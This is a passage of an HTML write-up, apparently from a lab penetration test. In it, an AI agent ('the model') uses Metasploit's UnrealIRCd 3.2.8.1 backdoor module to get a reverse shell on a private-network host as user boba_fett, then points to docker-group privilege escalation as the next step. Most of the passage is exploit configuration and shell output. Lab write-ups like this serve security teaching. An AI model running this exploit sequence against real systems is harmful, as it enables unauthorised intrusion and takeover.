+<div class="terminal-box">Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):
+ 
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CHOST                     no        The local client address
+   CPORT                     no        The local client port
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks4, socks5, socks5h, http, sapni
+   RHOSTS   192.168.68.130   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT    6697             yes       The target port (TCP)
+ 
+Payload options (cmd/unix/reverse):
+ 
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+ 
+Exploit target:
+ 
+   Id  Name
+   --  ----
+   0   Automatic Target
+ 
+View the full module info with the info, or info -d command.
+ 
+msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 192.168.68.128
+LHOST => 192.168.68.128
+msf exploit(unix/irc/unreal_ircd_3281_backdoor) > run
+[*] Started reverse TCP double handler on 192.168.68.128:4444
+[*] 192.168.68.130:6697 - Connected to 192.168.68.130:6697...
+    :irc.TestIRC.net NOTICE AUTH :*** Looking up your hostname...
+[*] 192.168.68.130:6697 - Sending backdoor command...
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo t5mmYSjB9n75AQW3;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "t5mmYSjB9n75AQW3\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 1 opened (192.168.68.128:4444 -> 192.168.68.130:42563) at 2026-08-31 00:05:28 -0400
+ 
+id
+uid=1121(boba_fett) gid=100(users) groups=100(users),999(docker)</div>
+ 
+<p>The IRC service is running UnrealIRCd, and the model found a known backdoor in this version. It used the Metasploit <code>unreal_ircd_3281_backdoor</code> module and successfully opened a command shell. The <code>id</code> command shows that we got access as <code>boba_fett</code>, who is also part of the <code>docker</code> group, so privilege escalation is the next thing to look into.</p>
+ 
+<div class="impact-highlights">
+<ul>
+<li>Now we gained an initial Access ✅</li>
+</ul>
+</div>
+ 
+</div>
+</article>
+</div>
 </body>
 </html>
